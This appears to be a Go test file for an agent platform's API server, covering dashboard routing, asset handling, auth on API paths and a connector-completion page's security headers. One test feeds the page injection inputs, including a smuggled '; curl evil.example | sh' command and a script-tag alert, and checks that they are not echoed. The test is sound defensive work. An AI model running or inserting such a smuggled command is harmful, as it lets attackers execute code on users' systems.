/*
Copyright (c) 2026.

MIT License - see LICENSE file for details.
*/

package api

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	corev1alpha1 "github.com/orka-agents/orka/api/v1alpha1"
)

func TestSetupStaticFiles_IndexHTML(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}

	if resp.StatusCode != http.StatusOK {
		t.Errorf("StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(ct, "text/html") {
		t.Errorf("Content-Type = %s, want text/html", ct)
	}
}

func TestSetupStaticFiles_SPARoutes(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	spaRoutes := []string{
		"/login",
		"/tasks",
		"/tasks/some-task-id",
		"/sessions",
		"/sessions/some-session-id",
		"/agents",
		"/agents/my-agent",
		"/tools",
		"/tools/my-tool",
	}

	for _, route := range spaRoutes {
		t.Run(route, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, route, nil)
			resp, err := server.app.Test(req)
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusOK {
				t.Errorf("StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
			}
			ct := resp.Header.Get("Content-Type")
			if !strings.Contains(ct, "text/html") {
				t.Errorf("Content-Type = %s, want text/html", ct)
			}
		})
	}
}

func TestSetupStaticFiles_Favicon(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	req := httptest.NewRequest(http.MethodGet, "/favicon.svg", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}

	// Favicon may or may not exist in stub embed; check it doesn't panic
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound {
		t.Errorf("StatusCode = %d, want 200 or 404", resp.StatusCode)
	}
}

func TestSetupStaticFiles_Assets(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	tests := []struct {
		name        string
		path        string
		wantCT      string
		expectExist bool
	}{
		{"JS asset", "/assets/main.js", "application/javascript", false},
		{"CSS asset", "/assets/style.css", "text/css", false},
		{"other asset", "/assets/image.png", "application/octet-stream", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, tt.path, nil)
			resp, err := server.app.Test(req)
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}

			// Assets may not exist in test embed, but the route handler should respond
			if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound {
				t.Errorf("StatusCode = %d, want 200 or 404", resp.StatusCode)
			}
		})
	}
}

func TestSetupStaticFiles_DoesNotInterfereWithAPI(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	// Health endpoints should still work
	req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		t.Errorf("healthz StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}

	// API endpoints should still require auth
	req = httptest.NewRequest(http.MethodGet, "/api/v1/tasks", nil)
	resp, err = server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	if resp.StatusCode != http.StatusUnauthorized {
		t.Errorf("API StatusCode = %d, want %d", resp.StatusCode, http.StatusUnauthorized)
	}
}

func TestSetupStaticFiles_IndexContent(t *testing.T) {
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()

	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	resp, err := server.app.Test(req)
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("Failed to read body: %v", err)
	}

	// The embedded stub has content (at least "x\n")
	if len(body) == 0 {
		t.Error("expected non-empty body for index.html")
	}
}

func newStaticTestServer(t *testing.T, config ServerConfig) *Server {
	t.Helper()
	scheme := runtime.NewScheme()
	_ = corev1alpha1.AddToScheme(scheme)
	_ = corev1.AddToScheme(scheme)
	config.Port = 8080
	return NewServer(fake.NewClientBuilder().WithScheme(scheme).Build(), nil, config)
}

func TestSetupStaticFiles_DashboardDisabledByDefault(t *testing.T) {
	server := newStaticTestServer(t, ServerConfig{})

	// Without the dashboard, its routes and the SPA fallback are gone: every
	// unrouted path is a JSON 404, the same answer the API paths give.
	for _, path := range []string{"/", "/login", "/tasks", "/settings/connectors", "/some-ui-route", "/assets/main.js", "/favicon.svg"} {
		t.Run(path, func(t *testing.T) {
			resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, path, nil))
			if err != nil {
				t.Fatalf("Test request failed: %v", err)
			}
			if resp.StatusCode != http.StatusNotFound {
				t.Fatalf("StatusCode = %d, want %d", resp.StatusCode, http.StatusNotFound)
			}
			if ct := resp.Header.Get("Content-Type"); !strings.Contains(ct, "application/json") {
				t.Fatalf("Content-Type = %s, want application/json", ct)
			}
		})
	}

	resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, "/healthz", nil))
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("healthz StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}
}

func getConnectorCompletionPage(t *testing.T, server *Server, target string) (*http.Response, string) {
	t.Helper()
	resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, target, nil))
	if err != nil {
		t.Fatalf("Test request failed: %v", err)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("Failed to read body: %v", err)
	}
	return resp, string(body)
}

func TestConnectorCompletionPage_WithoutDashboard(t *testing.T) {
	server := newStaticTestServer(t, ServerConfig{Connectors: ConnectorConfig{Enabled: true}})

	resp, body := getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=pending&connection=github-abc123&namespace=team-a")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
	}
	for header, want := range map[string]string{
		"Content-Type":            "text/html; charset=utf-8",
		"Cache-Control":           "no-store",
		"Referrer-Policy":         "no-referrer",
		"Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
		"X-Content-Type-Options":  "nosniff",
	} {
		if got := resp.Header.Get(header); got != want {
			t.Errorf("%s = %q, want %q", header, got, want)
		}
	}
	if want := "orka connection complete github-abc123 --namespace team-a --completion &lt;value&gt;"; !strings.Contains(body, want) {
		t.Fatalf("body does not show %q:\n%s", want, body)
	}
	if strings.Contains(body, "<script") {
		t.Fatalf("completion page must not run script:\n%s", body)
	}

	_, body = getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=error&reason=scopes_denied&connection=github-abc123")
	if !strings.Contains(body, "Linking failed (scopes_denied).") || strings.Contains(body, "orka connection complete") {
		t.Fatalf("error page should name the reason and offer no completion command:\n%s", body)
	}
}

func TestConnectorCompletionPage_ShowsOnlyValidatedQueryValues(t *testing.T) {
	server := newStaticTestServer(t, ServerConfig{Connectors: ConnectorConfig{Enabled: true}})

	// Anyone can send a person this URL, so a query value that is not a
	// Kubernetes name or a reason code must not become part of the command
	// the page tells them to run.
	_, body := getConnectorCompletionPage(t, server, connectorSettingsPath+
		"?status=pending&connection=x%3B%20curl%20evil.example%20%7C%20sh&namespace=a%20--server%20https://evil.example")
	if strings.Contains(body, "evil.example") {
		t.Fatalf("page echoed an unvalidated query value:\n%s", body)
	}
	if !strings.Contains(body, "orka connection complete &lt;name&gt; --completion &lt;value&gt;") || !strings.Contains(body, "orka connection list") {
		t.Fatalf("page should fall back to a placeholder name:\n%s", body)
	}

	_, body = getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=error&reason=%3Cscript%3Ealert(1)%3C/script%3E")
	if strings.Contains(body, "alert(1)") || !strings.Contains(body, "Linking failed.") {
		t.Fatalf("page echoed an unknown reason:\n%s", body)
	}
}

func TestConnectorCompletionPage_DashboardOwnsThePath(t *testing.T) {
	server := newStaticTestServer(t, ServerConfig{DashboardEnabled: true, Connectors: ConnectorConfig{Enabled: true}})

	index, ok := spaIndexHTML()
	if !ok {
		t.Fatal("embedded index.html is unavailable")
	}
	_, body := getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=pending&connection=github-abc123")
	if body != string(index) {
		t.Fatalf("with the dashboard enabled, its page finishes the link instead:\n%s", body)
	}
}
